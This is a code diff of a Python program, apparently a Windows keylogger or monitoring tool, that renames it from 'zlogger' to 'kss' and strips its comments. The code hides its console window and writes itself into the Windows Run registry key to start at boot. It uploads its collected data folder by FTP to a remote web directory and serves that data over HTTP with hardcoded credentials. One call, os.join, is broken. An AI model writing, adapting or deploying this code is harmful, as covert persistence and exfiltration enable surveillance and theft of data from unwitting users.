@@ -21,7 +21,7 @@ def current_time():
 #For creating app dir
 def dir_path():
     home_path = os.path.expanduser("~")
-    dir_name = "zlogger"
+    dir_name = "kss"
     app_root = os.path.join(home_path, dir_name)
     dir_path = os.path.join(app_root, user_name())
     if not os.path.exists(dir_path):
@@ -38,20 +38,13 @@ def hide_console():
     return True
 
 def add_startup():
-    # in python __file__ is the instant of file path where it was executed
     pth = os.path.dirname(os.path.realpath(__file__))
-    # name of the python file with extension
-    s_name="zlogger.py"    
-    # joins the file name to end of path address
+    s_name="kss.py"    
     address=os.join(pth,s_name) 
-    # key we want to change is HKEY_CURRENT_USER  key value is Software\Microsoft\Windows\CurrentVersion\Run
     key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
-    # open the key to make changes to
     open = winreg.OpenKey(key,key_value,0,winreg.KEY_ALL_ACCESS)
-    # modify the opened key
-    winreg.SetValueEx(open,"zlogger",0,winreg.REG_SZ,address)
-    # now close the opened key
+    winreg.SetValueEx(open,"kss",0,winreg.REG_SZ,address)
     winreg.CloseKey(open)
 
 # check if internet is connected or not
@@ -65,22 +58,16 @@ def is_connected():
     
 # Define a function to get the name of an interface from its GUID
 def get_interface_name(guid):
-    # Open the registry key that contains the mapping
     reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
     key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
-    # Try to get the subkey that corresponds to the GUID
     try:
         subkey = winreg.OpenKey(key, guid + r'\Connection')
-        # Try to get the value that contains the name
         try:
             name = winreg.QueryValueEx(subkey, 'Name')[0]
-            # Return the name
             return name
         except FileNotFoundError:
-            # If the value is not found, return None
             return None
     except FileNotFoundError:
-        # If the subkey is not found, return None
         return None
 
 #Getting current active network interface
@@ -103,8 +90,8 @@ def sync(host,username,passward):
         passward="zlogger"
     home_path = os.path.expanduser("~")
     dir_list = os.listdir(home_path)
-    if "zlogger" in dir_list:
-        source_path = os.path.join(home_path, "zlogger")
+    if "kss" in dir_list:
+        source_path = os.path.join(home_path, "kss")
         target_path = "/var/www/html/"
 
     SYNC = SyncFtp(host, username, passward)
@@ -139,7 +126,7 @@ class AuthHandler(http.server.SimpleHTTPRequestHandler):
             self.send_error(400, "Bad request")
             return
         username, password = base64.b64decode(auth_parts[1]).decode().split(":")
-        if username != "zlogger" or password != "zlogger":
+        if username != "kss" or password != "kss":
             self.send_error(403, "Forbidden")
             return
         super().do_GET()
@@ -148,7 +135,7 @@ def server():
     PORT = 8000
     DIRECTORY = "./"
     with socketserver.TCPServer(("", PORT), AuthHandler) as httpd:
-        print("Local server running at http://localhost:8000 default username and passward is: 'zlogger' \n ")
+        print("Local server running at http://localhost:8000 default username and passward is: 'kss' \n ")
         try:
             httpd.serve_forever()
         except KeyboardInterrupt:
